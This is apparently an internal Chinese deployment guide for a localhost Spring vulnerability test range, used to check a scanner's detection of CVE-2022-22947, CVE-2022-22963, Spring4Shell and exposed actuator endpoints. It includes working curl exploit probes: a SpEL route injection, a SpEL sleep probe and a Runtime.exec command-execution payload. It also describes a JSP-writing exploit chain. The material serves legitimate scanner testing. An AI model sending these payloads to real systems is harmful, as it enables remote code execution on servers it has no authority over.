# C2 Spring 组件靶场部署说明（v1.5.5 WP3）

> 本文档对应 2026-11-02 的 WP3「Spring 5 个零检出插件」能力建设：
> 把 5 个插件的判定放进**真实 Spring 组件**（不是签名 mock），并给每座站准备
> 「漏洞模式 / 安全模式」两套可切换状态，用于盲测对拍（vuln 应 CONFIRMED、safe 应不 CONFIRMED）。
> 源码在 `src/C2/**`（按仓库约定不进 git，可用 `scripts/c2_build.py` 重建），
> 本文档与 `scripts/c2_*.py` 进 git。

## 三、C2-1b 停车网关（19312）

### 3.1 为什么是 WebFlux + Gateway

Spring Cloud Gateway 只能跑在 Reactive 栈（WebFlux/Netty），与 `spring-boot-starter-web` 互斥。
SBA client 2.7 起提供 `ReactiveConfiguration`（`spring-boot-admin-client`），因此
「网关 + SBA 受管实例」可以共存于同一个进程——这正是 C2-1b 的形态（业务名 parking-gateway-service）。

### 3.2 暴露的真实漏洞面（默认 profile=vuln）

| 漏洞面 | 真实端点 | 真实响应（对拍口径） |
|---|---|---|
| CVE-2022-22947 Gateway RCE | `POST /actuator/gateway/routes/{id}` | **201 Created，body 为空，`Location: /routes/{id}`**（`AbstractGatewayControllerEndpoint.save` 即 `ResponseEntity.created(...).build()`）；`POST /actuator/gateway/refresh` 时对 filter args 求值 SpEL |
| Actuator env 配置覆盖 RCE | `POST /actuator/env` | **200**，body `{"<属性名>":"<属性值>"}`（spring-cloud-context 的 `WritableEnvironmentEndpointWebExtension.write` 返回 `Collections.singletonMap`）；写入的属性会出现在随后 `GET /actuator/env` 的 `manager` propertySource 中 |
| /trace 请求历史泄露 | `GET /actuator/trace`（Boot 1.x 兼容路径，`LegacyTraceController`） | **200**，body 含 `traces` 数组（真实 `InMemoryHttpTraceRepository` 数据，含请求头 cookie 等） |
| 同上（Boot 2.x 原生路径） | `GET /actuator/httptrace` | **200**，body 含 `traces` 数组 |

SPEL 真求值证据（无副作用验证，不执行命令）：

```bash
# 1. 建一个把 #{7*7} 写进响应头的路由（CVE-2022-22947 的 SpEL 注入点）
curl -X POST http://127.0.0.1:19312/actuator/gateway/routes/spelprobe \
  -H "Content-Type: application/json" \
  -d '{"id":"spelprobe","predicates":[{"name":"Path","args":{"pattern":"/spelprobe/**"}}],
       "filters":[{"name":"AddResponseHeader","args":{"name":"X-Spel-Probe","value":"#{7*7}"}}],
       "uri":"http://127.0.0.1:19312","order":0}'
# 2. refresh 触发求值
curl -X POST http://127.0.0.1:19312/actuator/gateway/refresh
# 3. 访问路由，期望响应头 X-Spel-Probe: 49
curl -i http://127.0.0.1:19312/spelprobe/probe
# 4. 清理
curl -X DELETE http://127.0.0.1:19312/actuator/gateway/routes/spelprobe
curl -X POST http://127.0.0.1:19312/actuator/gateway/refresh
```

> 扫描器侧注意：旧版 `gateway_rce` 只认响应 body 里的 `filters/predicate`，而真实 Gateway
> 创建路由返回 201 空 body —— 这是**扫描器判定缺陷**，已由 Lead 修（认 201+Location 并补 DELETE 清理）。
> 同样，`actuator_env_rce` 旧判定要求 body 含 `propertySources`，与真实写接口响应不符。

### 3.3 安全模式（C2_SBA_CLIENT_MODE=safe）

```
set C2_SBA_CLIENT_MODE=safe
python scripts\c2_sba.py stop
python scripts\c2_sba.py start
```

- 启动 `sba-client-safe.jar`：Gateway **3.1.1**（CVE-2022-22947 修复版，refresh 不再求值 SpEL）；
- `--spring.profiles.active=safe`：`management.endpoints.web.exposure.include=health,info`，
  env POST 关闭、gateway/httptrace 端点不可见、不注册 `LegacyTraceController`；
- 预期扫描结论：env/trace/gateway 三项均 404 → 不是 CONFIRMED。

## 四、C2-2 Spring4Shell（19313）

- 真实 Tomcat 9.0.58 + Spring Framework 5.3.17（CVE-2022-22965 受影响组合），war 部署；
- `scripts/c2_s4s.py` 启动时把 server.xml 的 AccessLogValve 幂等改为 `buffered=false`：
  Tomcat 默认缓冲日志会让被写入的 JSP 延迟数秒才落盘，导致利用链的 15×1s 轮询偶发全部落空；
  该调整只改刷盘时机，不改变漏洞。（server.xml 在 `tools/` 下，可由 lab 重建）
- 业务端点 `GET /`（设备登记页）与 `POST /device/add`（表单可达），对应扫描器 F7 的表单探测逻辑；
- `python main.py -u http://127.0.0.1:19313 --exploit` 会走真实 AccessLogValve 写 JSP 利用链，
  成功时 CONFIRMED（写入的 JSP 只 `out.print` 随机数字，无命令执行；AccessLogValve 会被 best-effort 还原）。

安全模式（应用层缓解，非升级）：

```
set C2_S4S_MODE=safe
python scripts\c2_s4s.py stop
python scripts\c2_s4s.py start
```

- 启动时给 Tomcat 传 `CATALINA_OPTS=-Ds4s.hardened=true`；
- `SafeBinder`（`@ControllerAdvice` + `@InitBinder`）打开 `class.* / *.class.*` 字段黑名单，
  与 CVE-2022-22965 官方缓解建议一致；
- 预期：`--exploit` 绑定被忽略 → 写不出 JSP → 扫描器应为 UNKNOWN（不得 CONFIRMED）。

## 五、C2-3 Spring Cloud Function（19314）

### 5.1 版本说明（关键）

CVE-2022-22963 修复版本是 **3.1.7 / 3.2.3**。原 C2-3 用的 3.2.5 **已经修复**：
header `spring.cloud.function.routing-expression` 改用受限的 `SimpleEvaluationContext` 求值，
`T(...)` 类型引用直接失败（实测 `T(java.lang.Thread).sleep(3000)` 0.01s 内返回 500，未睡眠）。
因此 WP3 把默认产物降到真实受影响版 **3.2.2**，3.2.5 作为安全对照。

### 5.2 真实漏洞行为（3.2.2）

```bash
# SpEL 求值（受洞：先睡眠 4s 再 500；修复版立即 500）
curl -X POST http://127.0.0.1:19314/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Thread).sleep(4000)" -d "probe"

# 命令执行（SpEL 可执行任意命令；示意，勿对未授权目标使用）
curl -X POST http://127.0.0.1:19314/functionRouter \
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{'cmd','/c','echo x > proof.txt'})" -d "probe"
```

注意：表达式求值结果会被当作**函数名**去 FunctionCatalog 查找，`49` 不是已注册函数，
所以真实响应是 **HTTP 500**（默认 `server.error.include-message=never`，body 不含求值结果）。
扫描器不能靠「200 + body 含 49」判定真实 SCF；WP3 建议改为**时序差分**（sleep 表达式）或 OAST。
> 这是扫描器判定缺陷，Lead 已在 scanner 侧修（时序差分）。

### 5.3 安全模式（C2_SCF_MODE=safe）

```
set C2_SCF_MODE=safe
python scripts\c2_scf.py stop
python scripts\c2_scf.py start
```

- 启动 `scf-safe.jar`：spring-cloud-function **3.2.5**（修复版）；
- 预期：routing-expression 不再求值，sleep 探针响应立即返回 → 扫描器不得 CONFIRMED。

## 七、已知边界

1. C2-1b 的业务下游 `127.0.0.1:19319/19320` 不在本组件靶场内启动，
   `/parking-api/**` 转发会 502 —— 网关路由表本身是真实的，不影响漏洞面。
2. Gateway 路由创建探针会在网关里留下 `test` 路由（旧扫描器不清理）；
   手工验证后请 DELETE + refresh，扫描器侧已要求补清理。
3. C2-2 的 `--exploit` 会在 Tomcat `webapps/ROOT` 留下一个只打印随机数字的 JSP，
   属预期遗留物；不会写入命令执行代码。
4. `src/C2/**` 与 `runtime/C2/**` 均为可重建产物，不进 git；换机后先跑 `scripts/c2_build.py`。
